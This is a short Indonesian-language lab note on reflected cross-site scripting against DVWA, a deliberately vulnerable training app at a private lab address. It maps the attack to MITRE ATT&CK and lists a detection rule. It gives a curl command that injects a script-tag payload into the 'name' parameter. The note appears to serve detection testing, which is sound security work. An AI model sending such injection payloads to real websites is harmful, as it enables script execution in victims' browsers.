# XSS (Cross-Site Scripting) Attack

## Deskripsi
XSS menyisipkan script berbahaya ke halaman web yang kemudian
dieksekusi di browser korban.

## MITRE ATT&CK
- Tactic: Execution
- Technique: T1059.007 — JavaScript

## Target
- URL: `http://192.168.217.130/DVWA/vulnerabilities/xss_r/`
- Parameter: `name`

## Attack Commands
```bash
SESS="PHPSESSID=YOUR_SESSION; security=low"

# Reflected XSS
curl -s "http://192.168.217.130/DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

## Detection
- Rule ID: 100012
- Level: 10 (High)
